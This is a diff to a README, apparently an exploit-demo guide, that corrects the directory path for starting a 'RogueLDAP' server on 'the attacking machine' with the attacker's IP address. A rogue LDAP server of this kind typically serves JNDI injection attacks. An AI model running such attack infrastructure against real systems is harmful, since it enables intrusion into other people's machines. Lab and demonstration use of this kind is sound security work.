@@ -48,7 +48,7 @@ In order to setup the environment and run the exploit the following steps should
 1. Open a new terminal window and run the ```RogueLDAP``` server at the attacking machine
 
 ```
-cd target
+cd RogueLDAP/RogueLDAP/target
 java -jar RogueLDAP-1.4-SNAPSHOT.jar -i <YOUR-IP-ADDRESS>
 ```
 
